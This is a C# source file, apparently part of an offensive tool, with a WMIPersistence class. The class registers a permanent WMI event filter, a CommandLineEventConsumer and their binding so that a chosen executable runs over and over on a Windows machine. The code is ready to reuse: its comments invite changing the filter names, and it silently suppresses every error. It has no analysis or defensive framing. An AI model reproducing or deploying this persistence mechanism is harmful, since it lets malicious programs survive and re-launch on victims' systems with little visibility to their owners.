using System;
using System.Management;

public static class WMIPersistence
{
    public static void CreateWMIEventSubscription(string exePath)
    {
        try
        {
            string query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.Status = 'OK'";

            ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
            scope.Connect();

          
            ManagementClass eventFilterClass = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
            ManagementObject eventFilter = eventFilterClass.CreateInstance();
            eventFilter["Name"] = "NebulaFilter"; // name can be changed here
            eventFilter["Query"] = query;
            eventFilter["QueryLanguage"] = "WQL";
            eventFilter["EventNamespace"] = "root\\CIMV2";
            eventFilter.Put();

           
            ManagementClass eventConsumerClass = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null);
            ManagementObject eventConsumer = eventConsumerClass.CreateInstance();
            eventConsumer["Name"] = "NebulaConsumer"; // u can change the name here
            eventConsumer["CommandLineTemplate"] = exePath;
            eventConsumer.Put();

           
            ManagementClass bindingClass = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null);
            ManagementObject binding = bindingClass.CreateInstance();
            binding["Filter"] = eventFilter.Path.RelativePath;
            binding["Consumer"] = eventConsumer.Path.RelativePath;
            binding.Put();

        }
        catch (Exception)
        {
            
        }
    }
}
